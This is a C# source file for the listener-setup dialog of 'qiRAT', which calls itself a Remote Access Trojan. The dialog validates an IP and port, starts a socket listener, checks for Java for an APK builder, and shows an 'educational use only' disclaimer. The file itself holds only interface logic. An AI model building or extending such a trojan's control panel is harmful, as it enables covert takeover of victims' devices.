using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace qıRAT
{
    public partial class portform : Form
    {
        private mainform mainform;

        public portform(mainform main)
        {
            InitializeComponent();
            textBoxlabel1.ReadOnly = true;
            textBoxlabel2.ReadOnly = true;
            this.mainform = main;
            this.MaximizeBox = false;
        }

        private void textBox1ip_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = !char.IsDigit(e.KeyChar) && e.KeyChar != '.' && !char.IsControl(e.KeyChar);
        }

        private void textBox1ip_Validating(object sender, CancelEventArgs e)
        {

        }

        private void textBox2port_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = !char.IsDigit(e.KeyChar) && !char.IsControl(e.KeyChar);
        }

        private void portform_Load(object sender, EventArgs e)
        {
            this.ActiveControl = null;
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (!IsJavaInstalled())
            {
                DialogResult result = MessageBox.Show(
                    "Java not found!\n\n" +
                    "Java is required to run the APK builder and server components.\n\n" +
                    "Would you like to download Java now?",
                    "Java Not Found",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Error);

                if (result == DialogResult.Yes)
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "https://www.java.com/en/download/",
                            UseShellExecute = true
                        });
                    }
                    catch
                    {
                        MessageBox.Show("Could not open download link. Please visit:\nhttps://www.java.com/en/download/",
                            "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                return;
            }

            if (!checkBox1.Checked)
            {
                MessageBox.Show("Are you forgetting something?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (string.IsNullOrWhiteSpace(textBox1ip.Text) ||
                string.IsNullOrWhiteSpace(textBox2port.Text))
            {
                MessageBox.Show("Are you forgetting something?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }


            if (!int.TryParse(textBox2port.Text, out int port) || port < 1 || port > 65535)
            {
                MessageBox.Show("Invalid port number! (1-65535)", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            try
            {

                mainform.labellocalip.Text = textBox1ip.Text;
                mainform.labelport.Text = textBox2port.Text;


                socket.StartListening(textBox1ip.Text, port);


                this.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start listening: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show(
    @"qiRAT has been developed solely for educational and research purposes
to understand RAT (Remote Access Trojan) architecture, malicious software
behavior, and malware analysis processes.

This project is intended for learning in the fields of:
• Cybersecurity
• Reverse Engineering
• Defensive Techniques

Any use of this software for illegal activities, unauthorized access,
data breaches, espionage, or harmful purposes is strictly prohibited.

Misuse of qiRAT may violate local and international laws.
All legal, criminal, and financial responsibility lies entirely with the user.
The developer assumes no liability for misuse.

By using this software, you agree to operate only in authorized,
controlled, and legal environments.",
    "qiRAT – Legal Disclaimer",
    MessageBoxButtons.OK,
    MessageBoxIcon.Information
);

        }


        private bool IsJavaInstalled()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "java",
                    Arguments = "-version",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit(3000);
                    return process.ExitCode == 0;
                }
            }
            catch
            {

                return false;
            }
        }
    }
}